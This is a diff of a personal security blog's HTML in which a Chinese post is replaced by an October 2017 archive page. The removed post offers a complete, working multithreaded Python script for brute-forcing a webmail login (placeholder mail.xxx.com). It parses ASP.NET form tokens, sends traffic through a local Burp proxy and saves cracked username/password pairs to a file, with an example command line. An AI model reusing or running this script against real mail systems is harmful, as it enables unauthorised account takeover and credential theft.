@@ -6,19 +6,14 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://oddboy.cn">
-  <title>多线程爆破脚本(python3) | Mr.Bingo&#39;s Blog</title>
+  <title>Archives: 2017/10 | Mr.Bingo&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。  主要功能脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。  关于这个库的使用，可以参考我之前写过的blog：Python argparse模块详解 1234567891011121314151617181920212223➜  python">
-<meta name="keywords" content="Python">
-<meta property="og:type" content="article">
-<meta property="og:title" content="多线程爆破脚本(python3)">
-<meta property="og:url" content="http://oddboy.cn/2017/06/多线程爆破脚本-python3/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Mr.Bingo's Blog">
+<meta property="og:url" content="http://oddboy.cn/archives/2017/10/index.html">
 <meta property="og:site_name" content="Mr.Bingo's Blog">
-<meta property="og:description" content="起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。  主要功能脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。  关于这个库的使用，可以参考我之前写过的blog：Python argparse模块详解 1234567891011121314151617181920212223➜  python">
-<meta property="og:updated_time" content="2017-06-27T02:00:40.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="多线程爆破脚本(python3)">
-<meta name="twitter:description" content="起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。  主要功能脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。  关于这个库的使用，可以参考我之前写过的blog：Python argparse模块详解 1234567891011121314151617181920212223➜  python">
+<meta name="twitter:title" content="Mr.Bingo's Blog">
   
     <link rel="alternative" href="/atom.xml" title="Mr.Bingo&#39;s Blog" type="application/atom+xml">
   
@@ -162,158 +157,60 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-多线程爆破脚本-python3" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      多线程爆破脚本(python3)
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2017" class="archive-year">2017</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/" class="archive-article-date">
+  	<time datetime="2017-10-17T06:55:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-17</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/">Apache Solr XML外部实体扩展(XXE)及远程代码执行（RCE CVE-2017-12629）</a>
     </h1>
   
 
-        
-        <a href="/2017/06/多线程爆破脚本-python3/" class="archive-article-date">
-  	<time datetime="2017-06-27T01:05:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>  起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。</p>
-</blockquote>
-<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><p>脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 </p>
-<p>关于这个库的使用，可以参考我之前写过的blog：<a href="http://oddboy.cn/2017/06/Python-argparse模块详解/">Python argparse模块详解</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">➜  pythonCode python3 BingoBF.py -h</div><div class="line">        .--.</div><div class="line">       |o_o |    ------------------</div><div class="line">       |:_/ |   &lt; Author: Mr.Bingo &gt;</div><div class="line">      //   \ \   ------------------</div><div class="line">     (|     | ) &lt;    oddboy.cn     &gt;</div><div class="line">    /&apos;\_   _/`\  ------------------</div><div class="line">    \___)=(___/</div><div class="line"></div><div class="line">usage: BingoBF [options]</div><div class="line"></div><div class="line">Brute Force 【https://mail.xxx.com] email&apos;s passwords.</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help   show this help message and exit</div><div class="line">  -u USERNAME  username</div><div class="line">  -U USERLIST  usernames</div><div class="line">  -p PASSWORD  password</div><div class="line">  -P PWDLIST   passwords</div><div class="line">  -o OUTPUT    print results to file</div><div class="line">  -t THREAD    mutli threads, default 3 threads</div><div class="line"></div><div class="line">+---+</div></pre></td></tr></table></figure>
-<a id="more"></a>
-<h2 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python3</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">import logging</div><div class="line">import argparse</div><div class="line">import queue</div><div class="line">import requests</div><div class="line">import threading</div><div class="line">import os</div><div class="line">import time</div><div class="line">import random</div><div class="line">from html.parser import HTMLParser</div><div class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</div><div class="line"></div><div class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</div><div class="line"># disable InsecureRequestWarning</div><div class="line"># 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：</div><div class="line"># https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho</div><div class="line"></div><div class="line">logging.basicConfig(level=logging.WARNING)       # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）</div><div class="line"></div><div class="line"># general settings</div><div class="line"></div><div class="line">target_url=&quot;https://mail.xxx.com/UserLogin.aspx&quot;</div><div class="line"></div><div class="line">writeFileLock = threading.Lock()    # 创建文件锁，避免写文件冲突。</div><div class="line">threadLock = threading.Lock()    #创建线程锁，避免对显示效果的影响。</div><div class="line"></div><div class="line"># 保存爆破结果</div><div class="line">def saveFile(message,outfilePath):</div><div class="line">    with open(outfilePath, &apos;a+&apos;, encoding = &apos;utf8&apos;) as f:  # 以追加的方法结果写入文件</div><div class="line">        f.write(message[0]+&quot;\t&quot;)</div><div class="line">        f.write(message[1]+&quot;\n&quot;)</div><div class="line"></div><div class="line"># 自定义一个Exception类,用于显示自定义的异常。</div><div class="line">class validcodeException(BaseException):</div><div class="line">    def __init__(self,mesg=&quot; @@@@@@@@@@@@@@@         valid code is wrong!!!!!!!&quot;):</div><div class="line">        print(mesg)</div><div class="line"></div><div class="line"># 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparser</div><div class="line">class BruteParser(HTMLParser):</div><div class="line">    def __init__(self):</div><div class="line">        HTMLParser.__init__(self)</div><div class="line">        self.tag_results = &#123;&#125;</div><div class="line"></div><div class="line">    def handle_starttag(self, tag, attrs):</div><div class="line">        if tag == &quot;input&quot;:</div><div class="line">            tag_name = None</div><div class="line">            tag_value = None</div><div class="line">            for name, value in attrs:</div><div class="line">                if name == &quot;name&quot;:</div><div class="line">                    tag_name = value</div><div class="line">                if name == &quot;value&quot;:</div><div class="line">                    tag_value = value</div><div class="line">            if (tag_name == &quot;__VIEWSTATE&quot;) or (tag_name == &quot;__VIEWSTATEGENERATOR&quot;) or (tag_name == &quot;__EVENTVALIDATION&quot;):</div><div class="line">                self.tag_results[tag_name] = tag_value</div><div class="line"></div><div class="line"># 核心实现类</div><div class="line">class Bruter(object):</div><div class="line">    def __init__(self, threads,userList,pwdList,outfilePath):</div><div class="line">        self.user_q=userList</div><div class="line">        self.pwdlist=list(pwdList.queue)      # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。</div><div class="line">        self.threads=threads</div><div class="line">        self.outfilePath=outfilePath</div><div class="line">        print(&quot;Total %d(%d * %d) tries( %d threads)&quot;% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads))</div><div class="line"></div><div class="line">    # 线程的创建与管理</div><div class="line">    def run_bruteforce(self):</div><div class="line">        thread_arr=[]       # 线程列表list</div><div class="line">        for i in range(self.threads):</div><div class="line">            t = threading.Thread(target=self.web_bruter)</div><div class="line">            thread_arr.append(t)            # 创建线程</div><div class="line">        for i in range(self.threads):</div><div class="line">            thread_arr[i].start()           # 开启线程</div><div class="line">        for i in range(self.threads):</div><div class="line">            thread_arr[i].join()            # 回归线程</div><div class="line"></div><div class="line">    # 核心方法</div><div class="line">    def web_bruter(self):</div><div class="line">        proxies = &#123; </div><div class="line">            &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, </div><div class="line">            &quot;https&quot;: &quot;https://127.0.0.1:8080&quot;, </div><div class="line">        &#125;       # Burpsuite的代理地址</div><div class="line"></div><div class="line">        # 初始化cookie以及hidden元素数据。</div><div class="line">        response = requests.get(target_url,proxies=proxies,verify=False)</div><div class="line">        cookie=response.cookies</div><div class="line"></div><div class="line">        # 解析异常表单字段</div><div class="line">        parser = BruteParser()</div><div class="line">        parser.feed(response.text)</div><div class="line">        post_tags = parser.tag_results</div><div class="line">        post_tags[&apos;cmdSubmit.x&apos;]=random.randint(1,47)       # 登录按钮图片 47x39像素</div><div class="line">        post_tags[&apos;cmdSubmit.y&apos;]=random.randint(1,39)</div><div class="line"></div><div class="line">        # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。</div><div class="line">        while not self.user_q.empty():</div><div class="line">            username = self.user_q.get().rstrip().decode(&quot;ascii&quot;)</div><div class="line">            for password in self.pwdlist:</div><div class="line">                password=password.decode(&quot;ascii&quot;)</div><div class="line">                post_tags[&quot;txtUsername&quot;]=username</div><div class="line">                post_tags[&quot;txtPassword&quot;]=password</div><div class="line">                </div><div class="line">                threadLock.acquire()    # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。</div><div class="line">                # \r将光标回退到行首（\b回退一格）,实现原地覆盖。</div><div class="line">                print(&quot; \b\b&quot;*100,end=&quot;&quot;)       # 退两格，清空一格。 实现清空。</div><div class="line">                print(&quot;\rTrying: %15s : %15s  (%d users left)&quot; % (username,password, self.user_q.qsize()),end=&quot;&quot;)</div><div class="line">                #time.sleep(2)          # 调试时使用的</div><div class="line">                threadLock.release()    # 释放线程锁</div><div class="line">                reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False)</div><div class="line"></div><div class="line">                if (&quot;欢迎使用XXX邮件系统&quot; in reqResult.text):   # 爆破成功</div><div class="line">                    threadLock.acquire()    # 取得线程锁</div><div class="line">                    print(&quot; \b\b&quot;*100,end=&quot;&quot;)</div><div class="line">                    print (&quot;\r[*] --&gt;  %15s\t%15s&quot; % (username,password))   # 打印到窗口</div><div class="line">                    #time.sleep(2)</div><div class="line">                    threadLock.release()    # 释放线程锁</div><div class="line">                    if self.outfilePath is not None:    # 输出到文件</div><div class="line">                        # 获取文件锁</div><div class="line">                        writeFileLock.acquire()</div><div class="line">                        try:</div><div class="line">                            # 追加到文件</div><div class="line">                            saveFile((username,password),self.outfilePath)</div><div class="line">                        finally:</div><div class="line">                            # 释放锁</div><div class="line">                            writeFileLock.release()</div><div class="line">                    break   # 跳出当前循环，进行下一个用户名爆破</div><div class="line">                if (&quot;您输入的验证码不正确，请重新输入!&quot; in reqResult.text): # 验证码错误，抛出异常！</div><div class="line">                    raise validcodeException(&quot;验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆&quot;)</div><div class="line">                    exit    # 退出！ 理论上不会执行这一句。</div><div class="line">                # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。</div><div class="line"></div><div class="line">                if  (&quot;对不起, 您输入的用户名或口令错误, 请重新输入。&quot; in reqResult.text):</div><div class="line">                    pass        # 占一个坑，没鸟用</div><div class="line">                pass</div><div class="line"></div><div class="line">                #time.sleep(2)</div><div class="line"># 读取文件，生成队列</div><div class="line">def build_list(listFile):   </div><div class="line">    # read in the list file</div><div class="line">    fd = open(listFile, &quot;rb&quot;)</div><div class="line">    raw_words = fd.readlines()</div><div class="line">    fd.close()</div><div class="line"></div><div class="line">    words = queue.Queue()</div><div class="line"></div><div class="line">    for word in raw_words:</div><div class="line">        word = word.rstrip()</div><div class="line">        words.put(word)</div><div class="line">    return words</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    headCharPic=&quot;\r        .--.\n       |o_o |    ------------------ \n       |:_/ |   &lt; Author: Mr.Bingo &gt;\n      //   \ \   ------------------ \n     (|     | ) &lt;    oddboy.cn     &gt;\n    /&apos;\_   _/`\  ------------------\n    \___)=(___/\n&quot;</div><div class="line">    print(headCharPic)</div><div class="line">    # 创建一个argparser解析器</div><div class="line">    parser=argparse.ArgumentParser(</div><div class="line">        prog=&quot;BingoBF&quot;,</div><div class="line">        usage=&quot; %(prog)s [options] &quot;,</div><div class="line">        description=&apos;Brute Force 【https://mail.xxx.com] email\&apos;s passwords.&apos;,</div><div class="line">        epilog=&quot;+---+\n&quot;</div><div class="line">        )</div><div class="line"></div><div class="line">    groupUser = parser.add_mutually_exclusive_group(required=True)</div><div class="line">    groupUser.add_argument(&apos;-u&apos;,dest=&quot;username&quot;,help=&quot;username&quot;)</div><div class="line">    groupUser.add_argument(&apos;-U&apos;,dest=&apos;userList&apos;,help=&quot;usernames&quot;)</div><div class="line"></div><div class="line">    groupPwd = parser.add_mutually_exclusive_group(required=True)</div><div class="line">    groupPwd.add_argument(&apos;-p&apos;,dest=&quot;password&quot;,help=&quot;password&quot;)</div><div class="line">    groupPwd.add_argument(&apos;-P&apos;,dest=&apos;pwdList&apos;,help=&quot;passwords&quot;)</div><div class="line"></div><div class="line">    parser.add_argument(&apos;-o&apos;,dest=&apos;output&apos;,help=&quot;print results to file&quot;)</div><div class="line"></div><div class="line">    parser.add_argument(&quot;-t&quot;,dest=&quot;thread&quot;,type=int,help=&quot;mutli threads, default 3 threads&quot;,default=3)</div><div class="line"></div><div class="line">    args=parser.parse_args()    # 命令行参数解析</div><div class="line">    </div><div class="line">    if args.username is not None:</div><div class="line">        userList=list(args.username)</div><div class="line">    else:</div><div class="line">        userList = build_list(args.userList)</div><div class="line">    if args.password is not None:</div><div class="line">        pwdList=list(args.password)</div><div class="line">    else:</div><div class="line">        pwdList = build_list(args.pwdList)</div><div class="line"></div><div class="line">    outfilePath = None</div><div class="line">    if args.output is not None:</div><div class="line">        outfilePath = args.output</div><div class="line">        filePath,fileName=os.path.split(outfilePath)</div><div class="line">        if (filePath!=&quot;&quot;) and (not os.path.exists(filePath)):</div><div class="line">            os.mikedirs(filePath)   # 若不存在这个目录则递归创建</div><div class="line"></div><div class="line">    if args.thread is not None:</div><div class="line">        user_thread=args.thread</div><div class="line"></div><div class="line">    bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)</div><div class="line">    bruter_obj.run_bruteforce()</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
-<h2 id="调用sample"><a href="#调用sample" class="headerlink" title="调用sample"></a>调用sample</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt</div></pre></td></tr></table></figure>
-<h2 id="附赠"><a href="#附赠" class="headerlink" title="附赠"></a>附赠</h2><p>命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://oddboy.cn/2017/06/多线程爆破脚本-python3/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2017/06/Python-argparse模块详解/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Python argparse模块详解
-        
-      </div>
-    </a>
   
   
-    <a href="/2017/07/Android开发及破解入门实例/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Android开发及破解入门实例</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-
-
-
-  
-  
-  
-  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
-<script>
-  var cloudTieConfig = {
-    url: "http://oddboy.cn/2017/06/多线程爆破脚本-python3/", 
-    sourceId: "多线程爆破脚本-python3",
-    productKey: "a63c0577991f4763b067b160ea7ae0e2",
-    target: "cloud-tie-wrapper"
-  };
-</script>
-<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
+    </div></section>
   
 
-  
-
-  
+    
 
 
           </div>
@@ -336,8 +233,8 @@ var _hmt = _hmt || [];
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
